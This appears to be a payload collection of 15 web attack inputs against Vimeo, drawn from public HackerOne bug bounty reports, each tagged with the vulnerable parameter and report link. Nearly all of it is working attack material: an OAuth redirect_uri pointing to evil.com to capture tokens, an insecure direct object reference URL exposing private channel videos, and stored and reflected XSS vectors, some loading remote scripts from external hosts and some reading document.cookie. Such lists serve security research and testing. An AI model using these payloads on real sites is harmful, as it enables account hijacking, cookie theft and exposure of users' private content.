# Vimeo

15 payloads.

### `638a976e`

```
https://target.com/dialog/oauth?client_id=19884028963&redirect_uri=https://evil.com/_facebook/join?ssl=0&iframe=0&popup=0&player=0&product_id=0&scope=email,basic_info,read_stream,publish_actions&state=
```

**Parameter:** `redirect_uri`
— [unvalid open authentication with facebook](https://hackerone.com/reports/44425) · Vimeo · [ckmk44](https://hackerone.com/ckmk44)

### `9574306e`

```
https://target.com/tools/widget/montage?widget=1&preview=1&user_id=36807051&badge_stream=channel&badge_channel=870575&badge_album=3231945&badge_layout=horizontal&badge_quantity=6&show_titles=no&badge_size=80
```

**Parameter:** `user_id`
— [CRITICAL vulnerability - Insecure Direct Object Reference - Unauthorized access to `Videos` of Channel whose privacy is set to `Private`.](https://hackerone.com/reports/45960) · Vimeo · [coolboss](https://hackerone.com/coolboss)

### `9e8c3f2a`

```
</script><script src="//domain">
```

**Parameter:** `name`
— [Stored XSS on target.com](https://hackerone.com/reports/85488) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `56e4388f`

```
</script><script src=/ñ.xyz>
```

**Parameter:** `name`
— [Stored XSS on target.com](https://hackerone.com/reports/85488) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `2aaabbd0`

```
alert(document.domain)
```

— [Stored XSS on target.com](https://hackerone.com/reports/85488) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `a1a4a1b1`

```
https://target.com/musicstore?section=%27-alert(document.domain
```

**Parameter:** `section`
— [Reflected XSS on target.com/musicstore](https://hackerone.com/reports/85615) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `5aa06975`

```
<img>
```

— [Stored XSS on target.com and evil.com](https://hackerone.com/reports/87577) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `5ccde158`

```
<img src="//u00f1.xyz/xss.swf">
```

— [Stored XSS on target.com and evil.com](https://hackerone.com/reports/87577) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `683caee6`

```
<script src=//u00f1.xyz>
```

— [XSS on target.com/home after other user follows you](https://hackerone.com/reports/87854) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `12fdff19`

```
" ontouchstart="alert(document.domain)
```

— [XSS on mobile version of target.com where the button "Follow" appears](https://hackerone.com/reports/88088) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `a13dd4ce`

```
"><script src=//u00f1.xyz>
```

— [XSS on mobile version of target.com where the button "Follow" appears](https://hackerone.com/reports/88088) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `1af6110c`

```
"onmouseover="alert(document.domain)&#x2f;
```

**Parameter:** `title`
— [XSS on target.com | "Search within these results" feature (requires user interaction)](https://hackerone.com/reports/88105) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `2d73f484`

```
<svg onload=eval(name)></svg>
```

— [XSS on target.com without user interaction and evil.com with user interaction](https://hackerone.com/reports/96229) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `f6bcb4d8`

```
prompt(document.domain,document.cookie)
```

— [XSS on target.com without user interaction and evil.com with user interaction](https://hackerone.com/reports/96229) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)

### `cbf38ce6`

```
prompt(document.domain, document.cookie)
```

— [XSS on target.com without user interaction and evil.com with user interaction](https://hackerone.com/reports/96229) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)
